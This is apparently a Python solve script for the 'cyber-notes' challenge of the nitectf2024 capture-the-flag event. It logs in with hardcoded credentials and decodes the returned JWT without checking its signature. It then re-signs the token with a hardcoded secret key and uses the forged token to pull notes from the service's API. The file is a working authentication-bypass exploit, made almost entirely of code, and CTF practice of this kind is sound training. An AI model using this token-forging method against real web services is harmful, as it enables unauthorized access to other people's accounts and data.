import jwt
import json
import requests

USERNAME = "D3aDs0ck"
PASSW = "bluM#_M@y_N3vr"
KEY = "H6jga21h1"

# URL = "http://127.0.0.1:5000/"
URL = "https://cyber-notes.chalz.nitectf2024.live/"

print("USERNAME:", USERNAME)
print("PASSWORD:", PASSW)
print("JWT KEY:", KEY)
print("URL:", URL)

# Get fake JWT
payload = json.dumps({
    "username": USERNAME,
    "password": PASSW
})
response = requests.request(
    "POST", URL+"api/login",  data=payload, headers={'Content-Type': 'application/json'})

fake_token = json.loads(response.text)["token"]

print("FAKE TOKEN:", fake_token)

# Sign fake jwt with real key to get real key
decoded = jwt.decode(fake_token, options={"verify_signature": False})
new_token = jwt.encode(decoded, KEY, algorithm='HS256')
print("REAL TOKEN:", new_token)

# Use new token to get real notes
payload = json.dumps({
    "username": USERNAME,
    "password": PASSW
})
response = requests.request("GET", URL+"api/notes",
                            headers={'Authorization': "Bearer " + new_token})

print(response.text)
